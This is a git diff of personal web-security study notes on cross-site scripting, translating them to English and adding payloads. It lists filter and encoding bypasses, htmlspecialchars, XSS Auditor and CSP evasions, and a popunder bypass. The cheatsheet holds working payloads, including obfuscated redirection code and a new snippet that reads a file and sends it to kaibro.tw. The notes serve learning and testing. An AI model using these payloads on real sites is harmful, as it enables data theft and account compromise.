@@ -1,41 +1,37 @@
 # Cross-Site Scripting  
 [同源策略](https://github.com/shinmao/Web-Security-Learning/blob/master/XSS/Same-Origin%20Policy.md)    
-1. reflected xss (非持久型):  
+1. reflected xss:  
 `<?php echo 'xss, '.$_GET['script']; ?>`
 
-2. stored xss (持久型):  
-Forum或者留言板中, 在文本中加入script. (前端可能用ajax讀取內容  
+2. stored xss:  
+Forum or mail board, insert script into the content.  
 `<?php echo 'xss, '.$DB_value; ?>`
 
-3. DOM xss: 最近の流行り  
-通過DOM操作觸發
+3. DOM xss: 最近の流行り  
+triggered by DOM operation  
 
-注意: reflective型 以及 stored型 才會與server有互動，因為server需要解析惡意代碼，而DOM型則是完全由客戶端js執行。  
+Attention: Only reflective stored would interact with server becuase server needs to parse malicious script, but DOM is completedly run in client side.  
   
 *  [XSS detection](#xss-detection)  
-*  [常見限制 and 對抗手勢](#常見限制-and-對抗手勢)  
+*  [Bypass tricks](#bypass-tricks)  
 *  [htmlspecialchars繞過](#htmlspecialchars-bypass)
 *  [XSS-Auditor介紹與繞過](#xss-auditor-intro-and-bypass)  
 *  [CSP介紹與繞過](#csp-intro-and-bypass)  
 *  [正規表達式](#正規表達式)  
 *  [攻擊手勢](#攻擊手勢)  
-*  [popunder彈窗手勢](#彈窗手勢)  
+*  [pop-up](#pop-up)  
 *  [Cheatsheet](#cheatsheet)    
 *  [Reference](#reference)
 
 # XSS detection
-這裡先不談XSS探針...  
-我習慣直接注入sciprt語句作測試，常見語句如下:  
+I am used to injecting sciprt directly for test, test like following:  
 ```js
 <script>alert(/1/);<script>
 <a href=1 onload=alert(1)>hi</a>
-```
-在這裏個人認為較重要的是分析注入點對網頁產生的影響，我注入的惡意代碼沒有作用可能有兩種原因：  
-1. 網頁不存在可利用的xss漏洞，可能注入點直接將值插入網頁作為內容  
-2. 惡意代碼被過濾掉，或者轉譯了 -> 這種情況下就要分析有沒有代替字元來繞過過濾名單，或者繞過轉譯！
+```  
 
-# 常見限制 and 對抗手勢
-* 大小寫混用  
+# Bypass tricks
+* Obfuscation  
 * toUpperCase()  
 ```js
 İ (%c4%b0).toLowerCase() => i
@@ -43,38 +39,37 @@ Forum或者留言板中, 在文本中加入script. (前端可能用ajax讀取內
 ſ (%c5%bf) .toUpperCase() => S
 K (%E2%84%AA).toLowerCase() => k
 ```
-* 一次過濾繞過  
+* Only one time filter  
 ```php
-str_replace('<script>','',$GET['hi'])  //這裏代表hi中的<script>會變空字串
+str_replace('<script>','',$GET['hi'])  // it means script in content will become space
 // <scr<script>ipt> 
 ```  
-* 使用正規表達式高效率的過濾  
+* filter with regex  
 ```php
-preg_replace( '/<(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i', '', $_GET['hi'])   // 大寫小寫一次繞過全都會被擋掉
+preg_replace( '/<(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i', '', $_GET['hi'])
 // <img src=1 onerror=alert(1)>
 ```
-* encode 轉譯危險標籤  
+* encode (parse the dangerous char  
   * url encode: `% + ASCII(hex) %3Cscript%3E`  
   * http://www.jsfuck.com/  
-  補充js常見處理函式: `escape()/unescape()`, `encodeURL()/decodeURL()`, `encodeURLComponent()/decodeURLComponent()`  
+  js func: `escape()/unescape()`, `encodeURL()/decodeURL()`, `encodeURLComponent()/decodeURLComponent()`  
   * html encode
   ```php
-  htmlspecialchars($_GET['hi']);  // 會將特殊字元通通轉譯掉 
-  // 這種情況下將無法再進行注入
+  htmlspecialchars($_GET['hi']);  // no open html tag for you 
   ```  
-  * unicode encode: %u + ASCII(hex) ASP,IIS上會自動解析unicode編碼，`<%s%cr%u0131pt>`  
-  * `IBM037`,`IBM500`,`IBM1026`,`cp875` 利用方法可以參考[ASPX上繞過RequestValidation](https://github.com/shinmao/Web-Security-Learning/blob/master/SQL-inj/README.md#bypass-requestvalidation-on-aspx)  
+  * unicode encode: %u + ASCII(hex) ASP,IIS will automatically parse unicode. `<%s%cr%u0131pt>`  
+  * `IBM037`,`IBM500`,`IBM1026`,`cp875` [Bypass RequestValidation on aspx](https://github.com/shinmao/Web-Security-Learning/blob/master/SQL-inj/README.md#bypass-requestvalidation-on-aspx)  
   * ascii encode
   ```js
   eval(String.fromCharCode(97,108,101,114,116,40,49,41))
   // <script>alert(1)</script>
   ```
   [Encode_tool](http://monyer.com/demo/monyerjs/)  
-  String.fromCharCode() 將unicode字碼轉換成字串 [Manual](https://www.w3schools.com/jsref/jsref_fromCharCode.asp)  
-  eval() 執行參數中的js語句 [Manual](https://www.w3schools.com/jsref/jsref_eval.asp)  
+  String.fromCharCode() converts unicode to string [Manual](https://www.w3schools.com/jsref/jsref_fromCharCode.asp)  
+  eval() run the js script [Manual](https://www.w3schools.com/jsref/jsref_eval.asp)  
 * length limit  
-  外部引入自己的js  
-* 未過濾`\n`類符號  
+  import js from outside  
+* Byass with line feed`\n`  
 ```js
 <img src="javas
 cript:
@@ -83,20 +78,20 @@ alert(/1/);">
 * XSS filters  
 * WAF  
 * HTML Sanitizer  
-* URL繞過`.`, `//`  
-  RWCTF2018裡學到的招式: `<?=ip2long("my-ip")`繞過dot，`\\`繞過`http://`  
-  順便補充: 第一個`/`是用來分隔schema和路徑，第二個`/`是路徑  
+* URL bypass `.`, `//`  
+  RWCTF2018: `<?=ip2long("my-ip")` bypass dot，`\\` bypass `http://`  
+  Sup: the first `/` is used to separate schema and path, the second `/` is part of path  
 * CSP(Content-Security-Policy)  
-  這部分內容有點多，我還是獨立出來筆記好了:sweat:  
+  The content of CSP is in following :sweat:  
 
 # htmlspecialchars bypass  
-php內部函數，可將`&`,`'`,`"`,`<`,`>`五種字元轉成字串。沒有第二個參數(`ENT_QUOTES`)時不會過濾單引號。  
-1. `htmlspecialchars($input)`在`value`屬性內：  
+php nature function, can convert `&`,`'`,`"`,`<`,`>` five kinds of char to string. It won't filter out the single quote if it doesn't have the second parameter(`ENT_QUOTES`).  
+1. `htmlspecialchars($input)` in `value`:  
 ```php
 <input value="<" onclick=alert(1)>
 ```  
-特殊字元被轉換成字串而閉合`value`屬性  
-2. 若頁面的編碼可控，可以嘗試用不同編碼繞過特殊字元，e.g. UTF-7
+special chars are converted to pure string and close the `value` attribute  
+2. If you can control the content encoding type, you can try such as UTF-7
 
 # XSS Auditor Intro and bypass
 XSS是chrome上面專門對付**Reflected XSS**的第三方防禦手段[XSS Auditor](https://www.chromium.org/developers/design-documents/xss-auditor)  
@@ -329,9 +324,9 @@ with SSTI
 :point_down: 彈框的內容為target的name  
 [參考原文](https://portswigger.net/blog/evading-csp-with-dom-based-dangling-markup)  
 
-# 彈窗手勢
-現在大部分的瀏覽器都禁止未禁用戶允許的彈窗了  
-@MasatoKinugawa 發現一個bypass限制的技巧：  
+# pop up
+Currently most of the browsers have stop from poping up window  
+@MasatoKinugawa find a trick to bypass:  
 ```js
 <script>
 onkeydown=function(){
@@ -341,12 +336,12 @@ onkeypress=function(){
     window.open('about:blank','_blank').close();
 }
 ```
-以上效果可瀏覽 https://vulnerabledoma.in/popunder/keyevent.html  
+https://vulnerabledoma.in/popunder/keyevent.html  
 [Popunder restriction bypass with keydown and keypress event](https://bugs.chromium.org/p/chromium/issues/detail?id=836841)  
 
 # Cheatsheet
 ```php
-</script>"><script src="data:;base64,YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=="></script>         // 協議解析
+</script>"><script src="data:;base64,YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=="></script>
 </ScRiPt>"><ScRiPt>prompt(1)</ScRiPt>
 "><script>al\u0065rt(document.domain)</script>
 "><script>al\u{65}rt(document.domain)</script>
@@ -361,9 +356,21 @@ document.write("<s","crip","t>al","ert(","1)","</s","cript>")
 location='http://\u{e01cc}\u{e01cd}\u{e01ce}\u{e01cf}\u{e01d0}\u{e01d1}\u{e01d2}\u{e01d3}\u{e01d4}\u{e01d5}google\u{e01da}\u{e01db}\u{e01dc}\u{e01dd}\u{e01de}\u{e01df}.com'
 
 // redirection
-atob.constructor(unescape([...escape((𐑬󠅯󠅣󠅡󠅴󠅩󠅯󠅮󠄽󠄧󠅨󠅴󠅴󠅰󠄺󠄯󠄯󠅩󠅢󠅭󠄮󠅣󠅯󠅭󠄧=ﾠ=>ﾠ).name)].filter((ﾠ,ㅤ)=>ㅤ%12<1|ㅤ%12>9).join([])))()
-```
-上面的cheatsheet除了有brutexss原有的payload還有一些自己蒐集的!  
+atob.constructor(unescape([...escape((𐑬󠅯󠅣󠅡󠅴󠅩󠅯󠅮󠄽󠄧󠅨󠅴󠅴󠅰󠄺󠄯󠄯󠅩󠅢󠅭󠄮󠅣󠅯󠅭󠄧=ﾠ=>ﾠ).name)].filter((ﾠ,ㅤ)=>ㅤ%12<1|ㅤ%12>9).join([])))()  
+
+// Use xss to read file
+xmlhttp=new XMLHttpRequest();
+xmlhttp.onreadystatechange=function()
+{
+        if (xmlhttp.readyState==4 && xmlhttp.status==200)
+        {
+            document.location='http://kaibro.tw/log.php?c='+btoa(xmlhttp.responseText);
+        }
+}
+xmlhttp.open("GET","abc.php",true);
+xmlhttp.setRequestHeader("Content-type","application/x-www-form-urlencoded");
+xmlhttp.send("url=file:///etc/passwd");
+```  
 [Brute XSS payload by Pgaijin66](https://github.com/Pgaijin66/XSS-Payloads/blob/master/payload.txt)  
 
 # Reference
